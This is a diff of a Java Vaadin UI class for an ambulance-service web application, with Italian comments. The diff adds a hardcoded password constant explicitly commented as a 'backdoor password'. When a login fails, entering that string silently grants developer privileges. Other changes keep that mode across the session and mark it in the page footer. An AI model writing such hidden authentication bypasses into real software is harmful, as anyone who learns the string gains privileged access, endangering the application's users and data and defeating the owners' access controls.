@@ -55,6 +55,8 @@ import java.util.List;
 @Push(value = PushMode.AUTOMATIC, transport = Transport.WEBSOCKET_XHR)   // se non uso questo tipo di transport i cookies non funzionano
 public class WamUI extends UI {
 
+    //--backdoor password
+    public static final String BACKDOOR = "gac";
     public static final String KEY_TABELLONE = "tabellone";
     public static final String KEY_MAIN_COMP = "maincomp";
     public static final String KEY_TABVISIBLE = "tabvisible";
@@ -77,8 +79,14 @@ public class WamUI extends UI {
             developerInit();
             return;
         } else {
-            LibSession.setDeveloper(false);
-        }
+            if (LibSession.isDeveloper()) {
+                developerInit();
+                return;
+            }// end of if cycle
+
+//            LibSession.setDeveloper(false);
+        }// end of if/else cycle
+
 
         // da qui in poi non è programmatore
 
@@ -137,8 +145,31 @@ public class WamUI extends UI {
                         UI.getCurrent().setContent(getTabellone());
 
                     } else {
-                        Notification notif = new Notification("Username o password errati", "", Notification.Type.ERROR_MESSAGE);
-                        notif.show(Page.getCurrent());
+                        Object obj;
+                        WamLogin wamLogin = null;
+                        AbsLoginForm form = null;
+                        String backDoorKey = "";
+                        obj = e.getSource();
+                        if (obj instanceof WamLogin) {
+                            wamLogin = (WamLogin) obj;
+                        }// end of if cycle3
+                        if (wamLogin != null) {
+                            form = wamLogin.getLoginForm();
+                        }// end of if cycle
+                        if (form != null) {
+                            backDoorKey = form.getPassField().getValue();
+                        }// end of if cycle
+
+                        if (backDoorKey != null && backDoorKey.equals(BACKDOOR)) {
+//                            Notification notif = new Notification("Sei entrato come programmatore", "", Notification.Type.WARNING_MESSAGE);
+                            LibSession.setDeveloper(true);
+                        } else {
+                            Notification notif = new Notification("Username o password errati", "", Notification.Type.ERROR_MESSAGE);
+                            notif.show(Page.getCurrent());
+                        }// end of if/else cycle
+//                            Notification notif = new Notification("Username o password errati", "", Notification.Type.ERROR_MESSAGE);
+//                            notif.show(Page.getCurrent());
+
                     }
                 }
             });
@@ -616,11 +647,28 @@ public class WamUI extends UI {
         footer.setHeight("30px");
 
         footer.addComponent(new Label("Algos s.r.l."));
-        footer.addComponent(new Label(" - "));
+        footer.addComponent(new Label("-"));
         footer.addComponent(new Label("webAmbulanze"));
+
+        if (LibSession.isDeveloper()) {
+            footer.addComponent(new Label("- programmatore"));
+        } else {
+            if (LibSession.isAdmin()) {
+                footer.addComponent(new Label("- admin"));
+            }// end of if/else cycle
+        }// end of if/else cycle
+
         if (CompanySessionLib.getCompany() != null) {
-            footer.addComponent(new Label("company " + CompanySessionLib.getCompany().getCompanyCode()));
+            footer.addComponent(new Label("- " + CompanySessionLib.getCompany().getCompanyCode()));
         }// end of if cycle
+
+        if (LibSession.isDeveloper()) {
+            footer.addStyleName("rosso");
+        } else {
+            if (LibSession.isAdmin()) {
+                footer.addStyleName("salmone");
+            }// end of if/else cycle
+        }// end of if/else cycle
 
         return footer;
     }// end of method
